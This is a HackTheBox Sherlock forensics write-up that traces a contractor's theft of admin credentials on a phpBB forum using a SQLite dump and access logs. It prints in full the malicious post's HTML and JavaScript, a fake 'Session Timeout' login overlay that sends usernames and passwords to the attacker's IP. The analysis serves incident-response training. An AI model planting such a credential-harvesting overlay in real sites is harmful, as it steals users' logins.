---
title: HTB Sherlock: Bumblebee
url: https://0xdf.gitlab.io/2024/05/22/htb-sherlock-bumblebee.html
date: 2024-05-22T09:00:00+00:00
difficulty: Easy
tags: htb-sherlock, forensics, dfir, ctf, sherlock-bumblebee, sherlock-cat-dfir, hackthebox, sqlite, phpbb, access-log, credential-theft
---

![Bumblebee](/icons/sherlock-bumblebee.png)

Bumblebee is a fun introductory level Sherlock. All the data needed to solve the challenge is in a sqlite database for a phpBB instance and an access log file. No fancy tools, just SQLite and Bash commands. I’ll show how a user created a malicious post and got the admin to send their credentials to the attacker. Then they used the creds to log in as admin, give their own account administrator privileges, and export the database.

## Challenge Info

| Name | [Bumblebee](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fbumblebee)  [Bumblebee](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fbumblebee) [Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fsherlocks%2fbumblebee) |
| --- | --- |
| Release Date | 13 November 2023 |
| Retire Date | 4 January 2024 |
| Difficulty | Easy |
| Category | DFIR DFIR |
| Creator | [blitztide blitztide](https://app.hackthebox.com/users/6893) |

## Background

### Scenario

> An external contractor has accessed the internal forum here at Forela via the Guest Wi-Fi, and they appear to have stolen credentials for the administrative user! We have attached some logs from the forum and a full database dump in sqlite3 format to help you in your investigation.

Notes from the scenario:
- The contractor connected via internal WiFi, so private IPs make sense.
- “Stole” creds for the admin user.
- Have logs and a SQLite database.

### Questions

To solve this challenge, I’ll need to answer the following 10 questions:
1. What was the username of the external contractor?
2. What IP address did the contractor use to create their account?
3. What is the post\_id of the malicious post that the contractor made?
4. What is the full URI that the credential stealer sends its data to?
5. When did the contractor log into the forum as the administrator? (UTC)
6. In the forum there are plaintext credentials for the LDAP connection, what is the password?
7. What is the user agent of the Administrator user?
8. What time did the contractor add themselves to the Administrator group? (UTC)
9. What time did the contractor download the database backup? (UTC)
10. What was the size in bytes of the database backup as stated by access.log?

### Data

#### Artifacts

The given data has a single archive:

```

oxdf@hacky$ unzip -l bumblebee.zip 
Archive:  bumblebee.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    86837  2023-06-02 10:38   incident.tgz
---------                     -------
    86837                     1 file

```

It has two files:

```

oxdf@hacky$ tar tf incident.tgz 
./phpbb.sqlite3
access.log

```

#### phpbb.sqlite3

This database has a bunch of tables:

```

oxdf@hacky$ sqlite3 phpbb.sqlite3
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
phpbb_acl_groups           phpbb_oauth_tokens       
phpbb_acl_options          phpbb_poll_options       
phpbb_acl_roles            phpbb_poll_votes         
phpbb_acl_roles_data       phpbb_posts              
phpbb_acl_users            phpbb_privmsgs           
phpbb_attachments          phpbb_privmsgs_folder    
phpbb_banlist              phpbb_privmsgs_rules     
phpbb_bbcodes              phpbb_privmsgs_to        
phpbb_bookmarks            phpbb_profile_fields     
phpbb_bots                 phpbb_profile_fields_data
phpbb_config               phpbb_profile_fields_lang
phpbb_config_text          phpbb_profile_lang       
phpbb_confirm              phpbb_ranks              
phpbb_disallow             phpbb_reports            
phpbb_drafts               phpbb_reports_reasons    
phpbb_ext                  phpbb_search_results     
phpbb_extension_groups     phpbb_search_wordlist    
phpbb_extensions           phpbb_search_wordmatch   
phpbb_forums               phpbb_sessions           
phpbb_forums_access        phpbb_sessions_keys      
phpbb_forums_track         phpbb_sitelist           
phpbb_forums_watch         phpbb_smilies            
phpbb_groups               phpbb_styles             
phpbb_icons                phpbb_teampage           
phpbb_lang                 phpbb_topics             
phpbb_log                  phpbb_topics_posted      
phpbb_login_attempts       phpbb_topics_track       
phpbb_migrations           phpbb_topics_watch       
phpbb_moderator_cache      phpbb_user_group         
phpbb_modules              phpbb_user_notifications 
phpbb_notification_types   phpbb_users              
phpbb_notifications        phpbb_warnings           
phpbb_oauth_accounts       phpbb_words              
phpbb_oauth_states         phpbb_zebra

```

The ones that will prove interesting for this investigation are `phpbb_users`, `phpbb_posts`, `phpbb_log`, and `phpbb_config`.

#### access.log

The `access.log` file looks like the standard format from Apache or nginx webservers:

```

oxdf@hacky$ head access.log 
10.10.0.78 - - [25/Apr/2023:12:07:39 +0100] "GET / HTTP/1.1" 200 4205 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.10.0.78 - - [25/Apr/2023:12:07:40 +0100] "GET /assets/css/font-awesome.min.css?assets_version=3 HTTP/1.1" 200 7390 "http://10.10.0.27/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.10.0.78 - - [25/Apr/2023:12:07:40 +0100] "GET /styles/prosilver/theme/stylesheet.css?assets_version=3 HTTP/1.1" 200 611 "http://10.10.0.27/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.10.0.78 - - [25/Apr/2023:12:07:40 +0100] "GET /styles/prosilver/theme/en/stylesheet.css?assets_version=3 HTTP/1.1" 200 422 "http://10.10.0.27/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.10.0.78 - - [25/Apr/2023:12:07:40 +0100] "GET /styles/prosilver/template/forum_fn.js?assets_version=3 HTTP/1.1" 200 7094 "http://10.10.0.27/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.10.0.78 - - [25/Apr/2023:12:07:40 +0100] "GET /assets/javascript/core.js?assets_version=3 HTTP/1.1" 200 13272 "http://10.10.0.27/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.10.0.78 - - [25/Apr/2023:12:07:40 +0100] "GET /assets/javascript/jquery.min.js?assets_version=3 HTTP/1.1" 200 34114 "http://10.10.0.27/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.10.0.78 - - [25/Apr/2023:12:07:40 +0100] "GET /styles/prosilver/theme/normalize.css?v=3.2 HTTP/1.1" 200 2915 "http://10.10.0.27/styles/prosilver/theme/stylesheet.css?assets_version=3" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.10.0.78 - - [25/Apr/2023:12:07:40 +0100] "GET /styles/prosilver/theme/base.css?v=3.2 HTTP/1.1" 200 1297 "http://10.10.0.27/styles/prosilver/theme/stylesheet.css?assets_version=3" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"
10.10.0.78 - - [25/Apr/2023:12:07:40 +0100] "GET /styles/prosilver/theme/utilities.css?v=3.2 HTTP/1.1" 200 795 "http://10.10.0.27/styles/prosilver/theme/stylesheet.css?assets_version=3" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"

```

### Artifact Background

#### phpbb Database

[phpBB](https://www.phpbb.com/) is a free and opensource bulletin board software written in PHP. It can use many different databases, but the scenario said that I’m given a dump in SQLite format (so either this bulletin board is using SQLite or the dump was converted to that).

#### access.log

`access.log` generically is a record of all the requests made to a webserver. This log uses the [Common Log Format](https://en.wikipedia.org/wiki/Common_Log_Format), which is what both the Apache and nginx webservers use. A line looks like:

```
10.10.0.78 - - [25/Apr/2023:12:07:39 +0100] "GET / HTTP/1.1" 200 4205 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0"

```

The values are:
- Client IP address
- “user-identifier”, typically blank
- “user id”, typically blank unless authenticated
- Timestamp (inside [])
- HTTP request
- HTTP status code
- Size of response in bytes
- Referrer URL
- Client User-Agent string.

### Tools

To interact with the database, I’ll use the `sqlite3` command line tool (installed with `apt install sqlite3`).

The `access.log` file is all ASCII text, so I’ll use `grep`, `cut`, and other Bash command line utilities.

## Admin Creds Stolen

### Users

Going to start by looking at `phpbb_users`:

```

sqlite> .schema phpbb_users
CREATE TABLE `phpbb_users` (
  `user_id` integer  NOT NULL PRIMARY KEY AUTOINCREMENT
,  `user_type` integer NOT NULL DEFAULT 0
,  `group_id` integer  NOT NULL DEFAULT 3
,  `user_permissions` mediumtext NOT NULL
,  `user_perm_from` integer  NOT NULL DEFAULT 0
,  `user_ip` varchar(40) NOT NULL DEFAULT ''
,  `user_regdate` integer  NOT NULL DEFAULT 0
,  `username` varchar(255) NOT NULL DEFAULT ''
,  `username_clean` varchar(255) NOT NULL DEFAULT ''
,  `user_password` varchar(255) NOT NULL DEFAULT ''
,  `user_passchg` integer  NOT NULL DEFAULT 0
,  `user_email` varchar(100) NOT NULL DEFAULT ''
,  `user_email_hash` integer NOT NULL DEFAULT 0
,  `user_birthday` varchar(10) NOT NULL DEFAULT ''
,  `user_lastvisit` integer  NOT NULL DEFAULT 0
,  `user_lastmark` integer  NOT NULL DEFAULT 0
,  `user_lastpost_time` integer  NOT NULL DEFAULT 0
,  `user_lastpage` varchar(200) NOT NULL DEFAULT ''
,  `user_last_confirm_key` varchar(10) NOT NULL DEFAULT ''
,  `user_last_search` integer  NOT NULL DEFAULT 0
,  `user_warnings` integer NOT NULL DEFAULT 0
,  `user_last_warning` integer  NOT NULL DEFAULT 0
,  `user_login_attempts` integer NOT NULL DEFAULT 0
,  `user_inactive_reason` integer NOT NULL DEFAULT 0
,  `user_inactive_time` integer  NOT NULL DEFAULT 0
,  `user_posts` integer  NOT NULL DEFAULT 0
,  `user_lang` varchar(30) NOT NULL DEFAULT ''
,  `user_timezone` varchar(100) NOT NULL DEFAULT ''
,  `user_dateformat` varchar(64) NOT NULL DEFAULT 'd M Y H:i'
,  `user_style` integer  NOT NULL DEFAULT 0
,  `user_rank` integer  NOT NULL DEFAULT 0
,  `user_colour` varchar(6) NOT NULL DEFAULT ''
,  `user_new_privmsg` integer NOT NULL DEFAULT 0
,  `user_unread_privmsg` integer NOT NULL DEFAULT 0
,  `user_last_privmsg` integer  NOT NULL DEFAULT 0
,  `user_message_rules` integer  NOT NULL DEFAULT 0
,  `user_full_folder` integer NOT NULL DEFAULT -3
,  `user_emailtime` integer  NOT NULL DEFAULT 0
,  `user_topic_show_days` integer  NOT NULL DEFAULT 0
,  `user_topic_sortby_type` varchar(1) NOT NULL DEFAULT 't'
,  `user_topic_sortby_dir` varchar(1) NOT NULL DEFAULT 'd'
,  `user_post_show_days` integer  NOT NULL DEFAULT 0
,  `user_post_sortby_type` varchar(1) NOT NULL DEFAULT 't'
,  `user_post_sortby_dir` varchar(1) NOT NULL DEFAULT 'a'
,  `user_notify` integer  NOT NULL DEFAULT 0
,  `user_notify_pm` integer  NOT NULL DEFAULT 1
,  `user_notify_type` integer NOT NULL DEFAULT 0
,  `user_allow_pm` integer  NOT NULL DEFAULT 1
,  `user_allow_viewonline` integer  NOT NULL DEFAULT 1
,  `user_allow_viewemail` integer  NOT NULL DEFAULT 1
,  `user_allow_massemail` integer  NOT NULL DEFAULT 1
,  `user_options` integer  NOT NULL DEFAULT 230271
,  `user_avatar` varchar(255) NOT NULL DEFAULT ''
,  `user_avatar_type` varchar(255) NOT NULL DEFAULT ''
,  `user_avatar_width` integer  NOT NULL DEFAULT 0
,  `user_avatar_height` integer  NOT NULL DEFAULT 0
,  `user_sig` mediumtext NOT NULL
,  `user_sig_bbcode_uid` varchar(8) NOT NULL DEFAULT ''
,  `user_sig_bbcode_bitfield` varchar(255) NOT NULL DEFAULT ''
,  `user_jabber` varchar(255) NOT NULL DEFAULT ''
,  `user_actkey` varchar(32) NOT NULL DEFAULT ''
,  `user_newpasswd` varchar(255) NOT NULL DEFAULT ''
,  `user_form_salt` varchar(32) NOT NULL DEFAULT ''
,  `user_new` integer  NOT NULL DEFAULT 1
,  `user_reminded` integer NOT NULL DEFAULT 0
,  `user_reminded_time` integer  NOT NULL DEFAULT 0
,  UNIQUE (`username_clean`)
);
CREATE INDEX "idx_phpbb_users_user_birthday" ON "phpbb_users" (`user_birthday`);
CREATE INDEX "idx_phpbb_users_user_email_hash" ON "phpbb_users" (`user_email_hash`);
CREATE INDEX "idx_phpbb_users_user_type" ON "phpbb_users" (`user_type`);

```

That is a lot of columns. I’ll note some interesting ones:
- `user_id` - useful for pivoting to other tables
- `user_type` - identify admin users
- `user_ip` - will help identify IP
- `user_regdate` - help timebound malicious activity
- `username` - easiest to think about
- `user_lastvisit` - information about login times

There are a lot of users, but the majority of them have a null last login time:

```

sqlite> select user_id, user_type, user_ip, datetime(user_regdate, 'unixepoch'), username, user_lastvisit from phpbb_users;
1|2||2023-04-12 10:56:20|Anonymous|0
2|3|10.255.254.2|2023-04-12 10:56:20|admin|1681298759
3|2||2023-04-12 10:56:20|AdsBot [Google]|0
4|2||2023-04-12 10:56:20|Alexa [Bot]|0
5|2||2023-04-12 10:56:20|Alta Vista [Bot]|0
6|2||2023-04-12 10:56:20|Ask Jeeves [Bot]|0
7|2||2023-04-12 10:56:20|Baidu [Spider]|0
8|2||2023-04-12 10:56:20|Bing [Bot]|0
9|2||2023-04-12 10:56:20|Exabot [Bot]|0
10|2||2023-04-12 10:56:20|FAST Enterprise [Crawler]|0
11|2||2023-04-12 10:56:20|FAST WebCrawler [Crawler]|0
12|2||2023-04-12 10:56:20|Francis [Bot]|0
13|2||2023-04-12 10:56:20|Gigabot [Bot]|0
14|2||2023-04-12 10:56:20|Google Adsense [Bot]|0
15|2||2023-04-12 10:56:20|Google Desktop|0
16|2||2023-04-12 10:56:20|Google Feedfetcher|0
17|2||2023-04-12 10:56:20|Google [Bot]|0
18|2||2023-04-12 10:56:20|Heise IT-Markt [Crawler]|0
19|2||2023-04-12 10:56:20|Heritrix [Crawler]|0
20|2||2023-04-12 10:56:20|IBM Research [Bot]|0
21|2||2023-04-12 10:56:20|ICCrawler - ICjobs|0
22|2||2023-04-12 10:56:20|ichiro [Crawler]|0
23|2||2023-04-12 10:56:20|Majestic-12 [Bot]|0
24|2||2023-04-12 10:56:20|Metager [Bot]|0
25|2||2023-04-12 10:56:20|MSN NewsBlogs|0
26|2||2023-04-12 10:56:20|MSN [Bot]|0
27|2||2023-04-12 10:56:20|MSNbot Media|0
28|2||2023-04-12 10:56:20|Nutch [Bot]|0
29|2||2023-04-12 10:56:20|Online link [Validator]|0
30|2||2023-04-12 10:56:20|psbot [Picsearch]|0
31|2||2023-04-12 10:56:20|Sensis [Crawler]|0
32|2||2023-04-12 10:56:20|SEO Crawler|0
33|2||2023-04-12 10:56:20|Seoma [Crawler]|0
34|2||2023-04-12 10:56:20|SEOSearch [Crawler]|0
35|2||2023-04-12 10:56:20|Snappy [Bot]|0
36|2||2023-04-12 10:56:20|Steeler [Crawler]|0
37|2||2023-04-12 10:56:20|Telekom [Bot]|0
38|2||2023-04-12 10:56:20|TurnitinBot [Bot]|0
39|2||2023-04-12 10:56:20|Voyager [Bot]|0
40|2||2023-04-12 10:56:20|W3 [Sitesearch]|0
41|2||2023-04-12 10:56:20|W3C [Linkcheck]|0
42|2||2023-04-12 10:56:20|W3C [Validator]|0
43|2||2023-04-12 10:56:20|YaCy [Bot]|0
44|2||2023-04-12 10:56:20|Yahoo MMCrawler [Bot]|0
45|2||2023-04-12 10:56:20|Yahoo Slurp [Bot]|0
46|2||2023-04-12 10:56:20|Yahoo [Bot]|0
47|2||2023-04-12 10:56:20|YahooSeeker [Bot]|0
48|3|10.255.254.2|2023-04-12 11:18:57|phpbb-admin|1682506869
49|0|10.255.254.2|2023-04-12 11:29:09|test|1681298949
50|0|10.255.254.2|2023-04-18 14:18:15|rsavage001|1681833634
51|0|10.10.0.78|2023-04-25 11:08:19|apoole|0
52|0|10.10.0.78|2023-04-25 12:15:41|apoole1|1682425447

```

Only five of the users seem to have logged in:

```

sqlite> select user_id, user_type, user_ip, datetime(user_regdate, 'unixepoch'), username, user_lastvisit from phpbb_users where user_lastvisit > 0;
2|3|10.255.254.2|2023-04-12 10:56:20|admin|1681298759
48|3|10.255.254.2|2023-04-12 11:18:57|phpbb-admin|1682506869
49|0|10.255.254.2|2023-04-12 11:29:09|test|1681298949
50|0|10.255.254.2|2023-04-18 14:18:15|rsavage001|1681833634
52|0|10.10.0.78|2023-04-25 12:15:41|apoole1|1682425447

```

apoole1 is the only one not from the admin’s IP of 10.255.254.2. Further investigation will confirm that the contractors name is apoole1 (Task 1) and IP is i10.10.0.78 (Task 2).

### Posts

#### Identify Post

The `phpbb_posts` table is smaller:

```

sqlite> .schema phpbb_posts
CREATE TABLE `phpbb_posts` (
  `post_id` integer  NOT NULL PRIMARY KEY AUTOINCREMENT
,  `topic_id` integer  NOT NULL DEFAULT 0
,  `forum_id` integer  NOT NULL DEFAULT 0
,  `poster_id` integer  NOT NULL DEFAULT 0
,  `icon_id` integer  NOT NULL DEFAULT 0
,  `poster_ip` varchar(40) NOT NULL DEFAULT ''
,  `post_time` integer  NOT NULL DEFAULT 0
,  `post_reported` integer  NOT NULL DEFAULT 0
,  `enable_bbcode` integer  NOT NULL DEFAULT 1
,  `enable_smilies` integer  NOT NULL DEFAULT 1
,  `enable_magic_url` integer  NOT NULL DEFAULT 1
,  `enable_sig` integer  NOT NULL DEFAULT 1
,  `post_username` varchar(255) NOT NULL DEFAULT ''
,  `post_subject` varchar(255) NOT NULL DEFAULT ''
,  `post_text` mediumtext NOT NULL
,  `post_checksum` varchar(32) NOT NULL DEFAULT ''
,  `post_attachment` integer  NOT NULL DEFAULT 0
,  `bbcode_bitfield` varchar(255) NOT NULL DEFAULT ''
,  `bbcode_uid` varchar(8) NOT NULL DEFAULT ''
,  `post_postcount` integer  NOT NULL DEFAULT 1
,  `post_edit_time` integer  NOT NULL DEFAULT 0
,  `post_edit_reason` varchar(255) NOT NULL DEFAULT ''
,  `post_edit_user` integer  NOT NULL DEFAULT 0
,  `post_edit_count` integer  NOT NULL DEFAULT 0
,  `post_edit_locked` integer  NOT NULL DEFAULT 0
,  `post_visibility` integer NOT NULL DEFAULT 0
,  `post_delete_time` integer  NOT NULL DEFAULT 0
,  `post_delete_reason` varchar(255) NOT NULL DEFAULT ''
,  `post_delete_user` integer  NOT NULL DEFAULT 0
);
CREATE INDEX "idx_phpbb_posts_forum_id" ON "phpbb_posts" (`forum_id`);
CREATE INDEX "idx_phpbb_posts_topic_id" ON "phpbb_posts" (`topic_id`);
CREATE INDEX "idx_phpbb_posts_poster_ip" ON "phpbb_posts" (`poster_ip`);
CREATE INDEX "idx_phpbb_posts_poster_id" ON "phpbb_posts" (`poster_id`);
CREATE INDEX "idx_phpbb_posts_tid_post_time" ON "phpbb_posts" (`topic_id`,`post_time`);
CREATE INDEX "idx_phpbb_posts_post_username" ON "phpbb_posts" (`post_username`);
CREATE INDEX "idx_phpbb_posts_post_visibility" ON "phpbb_posts" (`post_visibility`);

```

I’ll get interesting columns for posts with the `poster_id` of 52:

```

sqlite> select post_id, forum_id, topic_id, poster_ip, datetime(post_time, 'unixepoch'), post_username, post_subject, post_attachment, post_edit_count from phpbb_posts where poster_id = 52;
9|2|2|10.10.0.78|2023-04-25 12:17:22||Hello Everyone|0|0

```

Searching by `post_ip` returns the same single post, with `post_id` of 9 (Task 3), that was created at 1682425042, which is Tuesday, April 25, 2023 12:17:22 PM.

#### Post Analysis

The query `select post_text from phpbb_posts where poster_id = 52;` returns HTML content which beautifies to:

```

<div>
  <style>
    body {
      z-index: 100;
    }

    .modal {
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      z-index: 101;
      background-color: white;
      opacity: 1;
    }

    .modal.hidden {
      visibility: hidden;
    }
  </style>
  <script type="text/javascript">
    function sethidden() {
      const d = new Date();
      d.setTime(d.getTime() + (24 * 60 * 60 * 1000));
      let expires = "expires=" + d.toUTCString();
      document.cookie = "phpbb_token=1;" + expires + ";";
      var modal = document.getElementById('zbzbz1234');
      modal.classList.add("hidden");
    }
    document.addEventListener("DOMContentLoaded", function(event) {
      let cookieexists = false;
      let name = "phpbb_token=";
      let cookies = decodeURIComponent(document.cookie);
      let ca = cookies.split(';');
      for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
          c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
          cookieexists = true;
        }
      }
      if (cookieexists) {
        return;
      }
      var modal = document.getElementById('zbzbz1234');
      modal.classList.remove("hidden");
    });
  </script>
  <iframe name="hiddenframe" id="hiddenframe" style="display:none"></iframe>
  <div class="modal hidden" id="zbzbz1234" onload="shouldshow">
    <div id="wrap" class="wrap">
      <a id="top" class="top-anchor" accesskey="t"></a>
      <div id="page-header">
        <div class="headerbar" role="banner">
          <div class="inner">
            <div id="site-description" class="site-description">
              <a id="logo" class="logo" href="./index.php" title="Board index">
                <span class="site_logo"></span>
              </a>
              <h1>forum.forela.co.uk</h1>
              <p>Forela internal forum</p>
              <p class="skiplink">
                <a href="#start_here">Skip to content</a>
              </p>
            </div>
            <div id="search-box" class="search-box search-header" role="search">
              <form action="./search.php" method="get" id="search1">
                <fieldset>
                  <input name="keywords" id="keywords1" type="search" maxlength="128" title="Search for keywords" class="inputbox search tiny" size="20" value="" placeholder="Search…">
                  <button class="button button-search" type="submit" title="Search">
                    <i class="icon fa-search fa-fw" aria-hidden="true"></i>
                    <span class="sr-only">Search</span>
                  </button>
                  <a href="./search.php" class="button button-search-end" title="Advanced search">
                    <i class="icon fa-cog fa-fw" aria-hidden="true"></i>
                    <span class="sr-only">Advanced search</span>
                  </a>
                </fieldset>
              </form>
            </div>
          </div>
        </div>
        <div class="navbar" role="navigation">
          <div class="inner">
            <ul id="nav-main" class="nav-main linklist" role="menubar">
              <li id="quick-links" class="quick-links dropdown-container responsive-menu" data-skip-responsive="true">
                <a href="#" class="dropdown-trigger dropdown-toggle">
                  <i class="icon fa-bars fa-fw" aria-hidden="true"></i>
                  <span>Quick links</span>
                </a>
                <div class="dropdown">
                  <div class="pointer">
                    <div class="pointer-inner"></div>
                  </div>
                  <ul class="dropdown-contents" role="menu">
                    <li class="separator"></li>
                    <li>
                      <a href="./search.php?search_id=unanswered" role="menuitem">
                        <i class="icon fa-file-o fa-fw icon-gray" aria-hidden="true"></i>
                        <span>Unanswered topics</span>
                      </a>
                    </li>
                    <li>
                      <a href="./search.php?search_id=active_topics" role="menuitem">
                        <i class="icon fa-file-o fa-fw icon-blue" aria-hidden="true"></i>
                        <span>Active topics</span>
                      </a>
                    </li>
                    <li class="separator"></li>
                    <li>
                      <a href="./search.php" role="menuitem">
                        <i class="icon fa-search fa-fw" aria-hidden="true"></i>
                        <span>Search</span>
                      </a>
                    </li>
                    <li class="separator"></li>
                  </ul>
                </div>
              </li>
              <li data-skip-responsive="true">
                <a href="/phpBB3/app.php/help/faq" rel="help" title="Frequently Asked Questions" role="menuitem">
                  <i class="icon fa-question-circle fa-fw" aria-hidden="true"></i>
                  <span>FAQ</span>
                </a>
              <li class="rightside" data-skip-responsive="true">
                <a href="./ucp.php?mode=login" title="Login" accesskey="x" role="menuitem">
                  <i class="icon fa-power-off fa-fw" aria-hidden="true"></i>
                  <span>Login</span>
                </a>
              </li>
              <li class="rightside" data-skip-responsive="true">
                <a href="./ucp.php?mode=register" role="menuitem">
                  <i class="icon fa-pencil-square-o  fa-fw" aria-hidden="true"></i>
                  <span>Register</span>
                </a>
              </li>
              </li data-skip-responsive="true">
            </ul>
            <ul id="nav-breadcrumbs" class="nav-breadcrumbs linklist navlinks" role="menubar">
              <li class="breadcrumbs" itemscope="" itemtype="http://schema.org/BreadcrumbList" style="max-width: 936px;">
                <span class="crumb" itemtype="http://schema.org/ListItem" itemprop="itemListElement" itemscope="">
                  <a href="./index.php" itemtype="https://schema.org/Thing" itemprop="item" accesskey="h" data-navbar-reference="index" title="Board index">
                    <i class="icon fa-home fa-fw"></i>
                    <span itemprop="name">Board index</span>
                  </a>
                  <meta itemprop="position" content="1">
                </span>
              </li>
              <li class="rightside responsive-search">
                <a href="./search.php" title="View the advanced search options" role="menuitem">
                  <i class="icon fa-search fa-fw" aria-hidden="true"></i>
                  <span class="sr-only">Search</span>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
      <a id="start_here" class="anchor"></a>
      <div id="page-body" class="page-body" role="main">
        <div class="panel">
          <div class="inner">
            <div class="content">
              <h3>Session Timeout</h3>
              <br />
              <br />
              <p>Your session token has timed out in order to proceed you must login again.</p>
            </div>
          </div>
        </div>
        <form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
          <div class="panel">
            <div class="inner">
              <div class="content">
                <h2 class="login-title">Login</h2>
                <fieldset class="fields1">
                  <dl>
                    <dt>
                      <label for="username">Username:</label>
                    </dt>
                    <dd>
                      <input type="text" tabindex="1" name="username" id="username" size="25" value="" class="inputbox autowidth">
                    </dd>
                  </dl>
                  <dl>
                    <dt>
                      <label for="password">Password:</label>
                    </dt>
                    <dd>
                      <input type="password" tabindex="2" id="password" name="password" size="25" class="inputbox autowidth" autocomplete="off">
                    </dd>
                  </dl>
                  <dl>
                    <dd>
                      <label for="autologin">
                        <input type="checkbox" name="autologin" id="autologin" tabindex="4">Remember me </label>
                    </dd>
                    <dd>
                      <label for="viewonline">
                        <input type="checkbox" name="viewonline" id="viewonline" tabindex="5">Hide my online status this session </label>
                    </dd>
                  </dl>
                  <dl>
                    <dt>&nbsp;</dt>
                    <dd>
                      <input type="submit" name="login" tabindex="6" value="Login" class="button1" onclick="sethidden()">
                    </dd>
                  </dl>
                </fieldset class="fields1">
              </div>
            </div>
          </div>
        </form>
      </div>
      <div id="page-footer" class="page-footer" role="contentinfo">
        <div class="navbar" role="navigation">
          <div class="inner">
            <ul id="nav-footer" class="nav-footer linklist" role="menubar">
              <li class="breadcrumbs">
                <span class="crumb">
                  <a href="./index.php" data-navbar-reference="index" title="Board index">
                    <i class="icon fa-home fa-fw" aria-hidden="true"></i>
                    <span>Board index</span>
                  </a>
                </span>
              </li>
              <li class="responsive-menu hidden rightside dropdown-container">
                <a href="javascript:void(0);" class="js-responsive-menu-link responsive-menu-link dropdown-toggle">
                  <i class="icon fa-bars fa-fw" aria-hidden="true"></i>
                </a>
                <div class="dropdown">
                  <div class="pointer">
                    <div class="pointer-inner"></div>
                  </div>
                  <ul class="dropdown-contents"></ul>
                </div>
              </li>
              <li class="rightside">All times are <span title="UTC">UTC</span>
              </li>
              <li class="rightside">
                <a href="./ucp.php?mode=delete_cookies" data-ajax="true" data-refresh="true" role="menuitem">
                  <i class="icon fa-trash fa-fw" aria-hidden="true"></i>
                  <span>Delete cookies</span>
                </a>
              </li>
            </ul>
          </div>
        </div>
        <div class="copyright">
          <p class="footer-row">
            <span class="footer-copyright">Powered by <a href="https://www.phpbb.com/">phpBB</a>® Forum Software © phpBB Limited </span>
          </p>
          <p class="footer-row">
            <a class="footer-link" href="./ucp.php?mode=privacy" title="Privacy" role="menuitem">
              <span class="footer-link-text">Privacy</span>
            </a> | <a class="footer-link" href="./ucp.php?mode=terms" title="Terms" role="menuitem">
              <span class="footer-link-text">Terms</span>
            </a>
          </p>
        </div>
        <div id="darkenwrapper" class="darkenwrapper" data-ajax-error-title="AJAX error" data-ajax-error-text="Something went wrong when processing your request." data-ajax-error-text-abort="User aborted request." data-ajax-error-text-timeout="Your request timed out; please try again." data-ajax-error-text-parsererror="Something went wrong with the request and the server returned an invalid reply.">
          <div id="darken" class="darken">&nbsp;</div>
        </div>
        <div id="phpbb_alert" class="phpbb_alert" data-l-err="Error" data-l-timeout-processing-req="Request timed out.">
          <a href="#" class="alert_close">
            <i class="icon fa-times-circle fa-fw" aria-hidden="true"></i>
          </a>
          <h3 class="alert_title">&nbsp;</h3>
          <p class="alert_text"></p>
        </div>
        <div id="phpbb_confirm" class="phpbb_alert">
          <a href="#" class="alert_close">
            <i class="icon fa-times-circle fa-fw" aria-hidden="true"></i>
          </a>
          <div class="alert_text"></div>
        </div>
      </div>
    </div>
    <div>
      <a id="bottom" class="anchor" accesskey="z"></a>
      <img src="./cron.php?cron_type=cron.task.core.tidy_warnings" width="1" height="1" alt="cron">
    </div>
  </div>
  <span>Greetings everyone, <br>
    <br> I am just a visiting IT Contractor, it's a fantastic company y'all have here. <br> I hope to work with you all again soon. <br>
    <br> Regards, <br>Alex Poole </span>
</div>

```

Right at the top I’ll note that it’s unusual / suspect for the post to have JavaScript embedded in it.

Dropping this into an [online beautifier / previewer](https://codebeautify.org/htmlviewer) generates the nicely-spaced code above, and offers this preview:

![image-20240520121231490](/img/image-20240520121231490.png)

Saving the HTML to a file and opening it in Firefox shows a bit more:

![image-20240520122201533](/img/image-20240520122201533.png)

Interestingly, it cuts off and won’t scroll further.

Looking at the raw HTML, at the top there’s JavaScript that waits for the page to load and then captures the user’s cookie:

```

    document.addEventListener("DOMContentLoaded", function(event) {
      let cookieexists = false;
      let name = "phpbb_token=";
      let cookies = decodeURIComponent(document.cookie);
      let ca = cookies.split(';');
      for (let i = 0; i < ca.length; i++) {
        let c = ca[i];
        while (c.charAt(0) == ' ') {
          c = c.substring(1);
        }
        if (c.indexOf(name) == 0) {
          cookieexists = true;
        }
      }
      if (cookieexists) {
        return;
      }
      var modal = document.getElementById('zbzbz1234');
      modal.classList.remove("hidden");
    });

```

If there is no cookie, it shows the `zbzbz1234` element. If I make that element hidden in my Firefox window (running `document.getElementById('zbzbz1234').classList.add("hidden");`  in the dev tools console), then the page looks different:

![image-20240520122434499](/img/image-20240520122434499.png)

Looking more closely at the form that gets hidden, it’s a fake login form pointing to the attacker’s IP:

